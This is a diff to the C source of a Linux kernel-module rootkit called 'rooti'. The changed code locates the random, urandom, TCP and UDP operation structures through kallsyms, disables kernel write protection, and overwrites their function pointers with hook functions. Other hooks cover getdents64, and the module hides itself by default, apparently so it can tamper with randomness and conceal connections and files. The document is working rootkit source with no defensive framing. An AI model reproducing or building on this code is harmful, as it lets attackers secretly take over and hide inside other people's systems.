@@ -12,7 +12,6 @@
 #include "hooking/init.h"
 #include "hooking/syscall.h"
 #include "hooking/func.h"
-#include "hooking/ops.h"
 #include "capabilities/privilege.h"
 #include "capabilities/track.h"
 #include "capabilities/hide.h"
@@ -55,6 +54,7 @@ static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
 
 // References to the original file operations which we are hooking
 static ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
+static ssize_t (*orig_urandom_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
 
 // References to the original seq operations which we are hooking
 static int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
@@ -280,16 +280,6 @@ struct rooti_func_hook func_hooks[] = {
     ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64)
 };
 
-struct rooti_file_ops_hook file_ops_hooks[] = {
-    ROOTI_OPS_HOOK("random_fops", ROOTI_FILE_READ_ITER, hook_random_read_iter, &orig_random_read_iter),
-    ROOTI_OPS_HOOK("urandom_fops", ROOTI_FILE_READ_ITER, hook_random_read_iter, &orig_random_read_iter),
-};
-
-struct rooti_seq_ops_hook seq_ops_hooks[] = {
-    ROOTI_OPS_HOOK("tcp4_seq_ops", ROOTI_SEQ_SHOW, hook_tcp4_seq_show, &orig_tcp4_seq_show),
-    ROOTI_OPS_HOOK("udp_seq_ops", ROOTI_SEQ_SHOW, hook_udp4_seq_show, &orig_udp4_seq_show)
-};
-
 /* LKM initialization */
 static int __init rooti_init(void)
 {
@@ -308,19 +298,30 @@ static int __init rooti_init(void)
         return ret;
     }
 
-    // Install file operation hooks :D
-    ret = rooti_install_file_ops_hooks(file_ops_hooks, ARRAY_SIZE(file_ops_hooks));
-    if (ret < 0) {
-        ROOTI_DEBUG("rooti_install_file_ops_hooks() failed: %d", ret);
-        return ret;
-    }
+    // Patch some operation structures function pointers. You could just hook the callbacks
+    // themselves but I wanted to try patching kernel objects directly in memory.
+    struct file_operations *random_file_ops = (struct file_operations *)__kallsyms_lookup_name("random_fops");
+    struct file_operations *urandom_file_ops = (struct file_operations *)__kallsyms_lookup_name("urandom_fops");
+    struct seq_operations *tcp_seq_ops = (struct seq_operations *)__kallsyms_lookup_name("tcp4_seq_ops");
+    struct seq_operations *udp_seq_ops = (struct seq_operations *)__kallsyms_lookup_name("udp_seq_ops");
 
-    // Install seq operations hooks :D
-    ret = rooti_install_seq_ops_hooks(seq_ops_hooks, ARRAY_SIZE(seq_ops_hooks));
-    if (ret < 0) {
-        ROOTI_DEBUG("rooti_install_seq_ops_hooks() failed: %d", ret);
-        return ret;
-    }
+    // Disable write protection
+    rooti_unprotect_memory();
+    
+    orig_random_read_iter = random_file_ops->read_iter;
+    random_file_ops->read_iter = hook_random_read_iter;
+
+    orig_urandom_read_iter = urandom_file_ops->read_iter;
+    urandom_file_ops->read_iter = hook_random_read_iter;
+
+    orig_tcp4_seq_show = tcp_seq_ops->show;
+    tcp_seq_ops->show = hook_tcp4_seq_show;
+
+    orig_udp4_seq_show = udp_seq_ops->show;
+    udp_seq_ops->show = hook_udp4_seq_show;
+
+    // Re-enable write protection
+    rooti_protect_memory();
 
     // If configured to be hidden by default, hide this rootkit
 #ifndef ROOTI_DEBUG_SHOWME
@@ -336,13 +337,27 @@ static void __exit rooti_exit(void)
     ROOTI_DEBUG("exit");
 
     rooti_uninstall_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
-    rooti_uninstall_file_ops_hooks(file_ops_hooks, ARRAY_SIZE(file_ops_hooks));
-    rooti_uninstall_seq_ops_hooks(seq_ops_hooks, ARRAY_SIZE(seq_ops_hooks));
 
-    struct rooti_tracked_fd *record;
-    struct rooti_tracked_fd *tmp;
+    // Restore kernel structures to their original form
+    struct file_operations *random_file_ops = (struct file_operations *)__kallsyms_lookup_name("random_fops");
+    struct file_operations *urandom_file_ops = (struct file_operations *)__kallsyms_lookup_name("urandom_fops");
+    struct seq_operations *tcp_seq_ops = (struct seq_operations *)__kallsyms_lookup_name("tcp4_seq_ops");
+    struct seq_operations *udp_seq_ops = (struct seq_operations *)__kallsyms_lookup_name("udp_seq_ops");
+
+    // Disable write protection
+    rooti_unprotect_memory();
+
+    random_file_ops->read_iter = orig_random_read_iter;
+    urandom_file_ops->read_iter = orig_urandom_read_iter;
+    tcp_seq_ops->show = orig_tcp4_seq_show;
+    udp_seq_ops->show = orig_udp4_seq_show;
+
+    // Re-enable write protection
+    rooti_protect_memory();
 
     // Release any remaining records
+    struct rooti_tracked_fd *record;
+    struct rooti_tracked_fd *tmp;
     for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
         list_for_each_entry_safe(record, tmp, rooti_tracked_fds_lists[i], head) {
             rooti_untrack_fd(record);
